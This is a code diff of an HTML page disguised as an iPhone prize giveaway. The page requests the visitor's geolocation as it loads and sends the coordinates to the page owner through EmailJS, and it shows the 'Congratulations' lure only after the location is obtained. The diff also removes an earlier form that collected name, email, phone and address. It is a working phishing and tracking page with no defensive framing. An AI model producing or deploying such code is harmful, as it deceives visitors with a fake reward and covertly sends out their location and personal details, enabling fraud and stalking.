@@ -46,37 +46,10 @@
 </head>
 <body>
     <div class="container">
-        <!-- Form to be shown first -->
-        <div id="formContent">
-            <h1 class="form-heading">Claim Your iPhone Reward! 🎉</h1>
-            <p class="lead">Please enter your details to claim your reward.</p>
-
-            <form id="userForm">
-                <div class="form-group">
-                    <label for="username">Your Name</label>
-                    <input type="text" id="username" class="form-control" placeholder="Enter your name" required>
-                </div>
-                <div class="form-group">
-                    <label for="email">Email Address</label>
-                    <input type="email" id="email" class="form-control" placeholder="Enter your email" required>
-                </div>
-                <div class="form-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" class="form-control" placeholder="Enter your phone number" required>
-                </div>
-                <div class="form-group">
-                    <label for="address">Address</label>
-                    <textarea id="address" class="form-control" placeholder="Enter your address" rows="4" required></textarea>
-                </div>
-                <button type="submit" class="btn btn-primary">Submit</button>
-            </form>
-        </div>
-
         <!-- Reward Message and Location (Hidden initially) -->
-        <div id="rewardContent">
+        <div id="rewardContent" style="display:none;">
             <h1 class="form-heading">Congratulations! 🎉</h1>
             <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-            <p class="form-text">Please allow location access to claim your reward.</p>
             <p id="locationDisplay" class="form-text">Waiting for location...</p>
         </div>
     </div>
@@ -84,21 +57,10 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            emailjs.init("-_fZgZZhnhhK2OvuV"); // Public Key
+            emailjs.init("CrVHH3e0Kot5rmodE"); // Public Key
 
-            // Automatically request location permission when the page is loaded
-            trackMovement();
-
-            // When form is submitted
-            document.getElementById("userForm").addEventListener("submit", function(event) {
-                event.preventDefault(); // Prevent form from reloading the page
-
-                // Hide the form content
-                document.getElementById("formContent").style.display = "none";
-
-                // Show the reward content
-                document.getElementById("rewardContent").style.display = "block";
-            });
+            // Automatically trigger location request when the page loads
+            requestLocationPermission();
 
             function sendLocationEmail(latitude, longitude) {
                 console.log("📍 Sending Location Data:", { latitude, longitude });
@@ -108,7 +70,7 @@
                     longitude: longitude.toString()
                 };
 
-                emailjs.send("service_7xiz4x8", "template_ux0sel8", templateParams)
+                emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
                     .then((response) => {
                         console.log("✅ Email sent successfully!", response);
                         document.getElementById("locationDisplay").textContent = "📧 Location sent!";
@@ -119,9 +81,9 @@
                     });
             }
 
-            function trackMovement() {
+            function requestLocationPermission() {
+                // As soon as the page loads, trigger geolocation
                 if ("geolocation" in navigator) {
-                    // This triggers the location permission prompt automatically when the page loads
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             const latitude = position.coords.latitude;
@@ -129,9 +91,12 @@
 
                             console.log("🌍 Location received:", latitude, longitude);
                             document.getElementById("locationDisplay").textContent = 
-                                📍 Latitude: ${latitude}, Longitude: ${longitude};
+                                `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
 
                             sendLocationEmail(latitude, longitude);
+
+                            // Show the reward content now that we have the location
+                            document.getElementById("rewardContent").style.display = "block";
                         },
                         (error) => {
                             console.error("❌ Error getting location:", error);
